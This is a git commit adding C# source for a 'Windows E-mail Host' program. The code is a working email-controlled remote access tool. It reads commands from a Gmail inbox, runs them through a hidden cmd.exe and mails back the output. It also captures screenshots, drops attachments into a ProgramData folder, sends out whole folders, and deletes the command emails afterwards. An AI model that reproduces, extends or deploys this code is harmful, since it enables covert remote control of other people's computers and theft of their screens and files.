f2789b9e9bbd7379dbaa2ae25ecd14e9e6c9c48b
Wisien <wisnia3221@gmail.com>
2018-08-16 11:45:43 +0200

    Added making SS, using CMD, downloading attachments

---
+++ Windows E-mail Host/MailRepository.cs
@@ -0,0 +1,69 @@
+﻿using System.Collections.Generic;
+using System.Linq;
+using System.Diagnostics;
+
+using ActiveUp.Net.Mail;
+using System;
+
+namespace Windows_E_mail_Host
+{
+    public class MailRepository
+    {
+        private Imap4Client client;
+
+        public MailRepository(string mailServer, int port, bool ssl, string login, string password)
+        {
+            if (ssl)
+                Client.ConnectSsl(mailServer, port);
+            else
+                Client.Connect(mailServer, port);
+            Client.Login(login, password);
+        }
+
+        public int[] GetMailIndexes(string mailBox, string searchPhrase)
+        {
+            Mailbox mails = Client.SelectMailbox(mailBox);
+            int[] messagesIndexes = mails.Search(searchPhrase);
+            return messagesIndexes;
+        }
+
+        public Message GetEmail(string mailBox, int i)
+        {
+            Mailbox mails = Client.SelectMailbox(mailBox);
+            Message message = mails.Fetch.MessageObject(i); ;
+
+            return message;
+        }
+
+        public void DelateMessage(string mailBox, int index)
+        {
+            client.SelectMailbox(mailBox).DeleteMessage(index, true);
+        }
+
+
+        ////////////////////////////////////////////////////////////
+
+
+        public IEnumerable<Message> GetAllMails(string mailBox)
+        {
+            return GetMails(mailBox, "ALL").Cast<Message>();
+        }
+
+        public IEnumerable<Message> GetUnreadMails(string mailBox)
+        {
+            return GetMails(mailBox, "UNSEEN").Cast<Message>();
+        }
+
+        protected Imap4Client Client
+        {
+            get { return client ?? (client = new Imap4Client()); }
+        }
+
+        private MessageCollection GetMails(string mailBox, string searchPhrase)
+        {
+            Mailbox mails = Client.SelectMailbox(mailBox);
+            MessageCollection messages = mails.SearchParse(searchPhrase);
+            return messages;
+        }
+    }
+}
---
+++ Windows E-mail Host/Program.cs
@@ -0,0 +1,245 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+using System.Net;
+using System.Net.Mail;
+
+using System.IO;
+
+using System.Drawing;
+
+using System.Threading;
+using ActiveUp.Net.Mail;
+
+using System.Diagnostics;
+using System.Drawing.Imaging;
+using System.Windows.Forms;
+
+namespace Windows_E_mail_Host
+{
+    class Program
+    {
+        private const string Login = "";
+        private const string Password = "";
+        
+        static string SSPatch = Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures);
+
+
+        static void Main(string[] args)
+        {
+            CheckForMail();
+            //UseCMD(new []{"echo Whello World in CMD", @"cd C:\\"});
+
+            Console.ReadKey();
+        }
+
+        //static string ParseHTML(string x)
+        //{
+        //    StringBuilder parsed = new StringBuilder();
+        //    bool ignore = false;
+
+        //    for (int i = 0; i < x.Length; i++)
+        //    {
+        //        if (x[i] == '<') ignore = true;
+        //        if (!ignore) parsed.Append(x[i]);
+        //        if (x[i] == '>') ignore = false;
+        //    }
+
+        //    return parsed.ToString();
+        //}
+
+
+        static void CheckForMail()
+        {
+            MailRepository mailRepository = new MailRepository(
+                                    "imap.gmail.com",
+                                    993,
+                                    true,
+                                    Login,
+                                    Password);
+
+            var allEmailsIndexes = mailRepository.GetMailIndexes("inbox", "ALL");
+
+            for (int i = allEmailsIndexes.Length - 1; i >= 0; i--)
+            {
+                ActiveUp.Net.Mail.Message email = mailRepository.GetEmail("inbox", allEmailsIndexes[i]);
+                if (email.Subject == Environment.MachineName + " / " + Environment.UserName)
+                {
+                    Console.WriteLine(email.BodyText.Text);
+
+
+                    string[] EmailLines = email.BodyText.Text.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
+
+
+
+                    for (int line = 0; line < EmailLines.Length; line++)
+                    {
+                        switch (EmailLines[line])
+                        {
+                            case "CMD":
+                                List<string> commands = new List<string>();
+                                for (int j = line + 1; j < EmailLines.Length; j++)
+                                {
+                                    if (EmailLines[j] == "END")
+                                    {
+                                        line = j;
+                                        break;
+                                    }
+                                    else commands.Add(EmailLines[j]);
+                                }
+                                sendEmail("CMD Return", UseCMD(commands), null);
+                                break;
+
+                            case "DOWNLOAD ATTACHMENT":
+
+                                string dpatch = @"C:\ProgramData\SystemData\";
+                                line++;
+                                if (EmailLines[line] != "END") dpatch = EmailLines[line];
+                                line++;
+
+                                if (email.Attachments.Count > 0)
+                                    email.Attachments.StoreToFolder(dpatch);
+
+                                break;
+                            case "MAKE SS":
+                                sendEmail("Screen captured", "", new[] { MakeScreenCapture() });
+
+                                break;
+                            case "SEND FOLDER":
+                                string spatch = @"C:\ProgramData\SystemData\";
+                                line++;
+                                if (EmailLines[line] != "END") spatch = EmailLines[line];
+                                line++;
+
+                                if (Directory.Exists(spatch)) sendEmail("FOLDER CONTENT SENDED", "", Directory.GetFiles(spatch));
+                                else sendEmail("FOLDER DOESN'T EXIST", "", null);
+
+                                break;
+                        }
+
+                    }
+
+
+
+                    mailRepository.DelateMessage("inbox", allEmailsIndexes[i]);
+                }
+
+
+
+
+
+                //    Console.WriteLine("<p>{0}: {1}</p><p>{2}</p>", email.From, email.Subject, (email.BodyHtml.Text));
+                //    if (email.Attachments.Count > 0)
+                //    {
+                //        foreach (MimePart attachment in email.Attachments)
+                //        {
+                //            Console.WriteLine("<p>Attachment: {0} {1}</p>", attachment.ContentName, attachment.ContentType.MimeType);
+                //        }
+                //    }
+                //}
+            }
+        }
+
+        static string UseCMD(List<string> commands)
+        {
+            Process cmd = new Process();
+            cmd.StartInfo.FileName = "cmd.exe";
+            cmd.StartInfo.RedirectStandardInput = true;
+            cmd.StartInfo.RedirectStandardOutput = true;
+            cmd.StartInfo.CreateNoWindow = true;
+            cmd.StartInfo.UseShellExecute = false;
+            cmd.Start();
+
+            foreach (string command in commands)
+                cmd.StandardInput.WriteLine(command);
+
+            cmd.StandardInput.Flush();
+            cmd.StandardInput.Close();
+            cmd.WaitForExit();
+
+            return cmd.StandardOutput.ReadToEnd();
+        }
+
+        static void sendEmail(string subject, string body, string[] attachmentsPatch)
+        {
+            try
+            {
+                using (System.Net.Mail.SmtpClient client = new System.Net.Mail.SmtpClient())
+                {
+                    var credential = new NetworkCredential()
+                    {
+                        UserName = Login,
+                        Password = Password
+                    };
+
+                    client.Credentials = credential;
+
+                    client.Host = "smtp.gmail.com";
+                    client.Port = 587;
+                    client.EnableSsl = true;
+
+                    var message = new MailMessage();
+
+                    message.To.Add(new MailAddress(""));
+                    message.From = new MailAddress("");
+
+                    //message.IsBodyHtml = true;
+
+                    if (attachmentsPatch != null)
+                        foreach (string attachmentPatch in attachmentsPatch)
+                            message.Attachments.Add(new Attachment(attachmentPatch));
+
+
+                    StringBuilder bd = new StringBuilder(300);
+
+
+                    bd.Append(Environment.UserName);
+                    bd.Append(" - ");
+                    bd.Append(subject);
+
+                    message.Subject = bd.ToString();
+
+                    bd.Clear();
+
+                    bd.Append(@"Machinename: ");
+                    bd.Append(Environment.MachineName);
+                    bd.Append(Environment.NewLine);
+                    bd.Append(@"Username: ");
+                    bd.Append(Environment.UserName);
+                    bd.Append(Environment.NewLine);
+                    bd.Append(Environment.NewLine);
+                    bd.Append(DateTime.Now.ToString("yyyy-mm-dd + hh;mm;ss.fff"));
+                    bd.Append(Environment.NewLine);
+                    bd.Append(Environment.NewLine);
+                    bd.Append(body);
+
+                    message.Body = bd.ToString();
+
+
+                    client.Send(message);
+                }
+            }
+            catch (Exception) { }
+        }
+
+        static string MakeScreenCapture()
+        {
+            String name = SSPatch + DateTime.Now.ToString("yyyy-MM-dd + HH;mm;ss.fff") + ".jpg";
+
+            Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
+                                            Screen.PrimaryScreen.Bounds.Height);
+            Graphics graphics = Graphics.FromImage(printscreen as Image);
+            graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size);
+
+            
+            printscreen.Save(name, ImageFormat.Jpeg);
+
+            return name;
+        }
+
+
+    }
+}
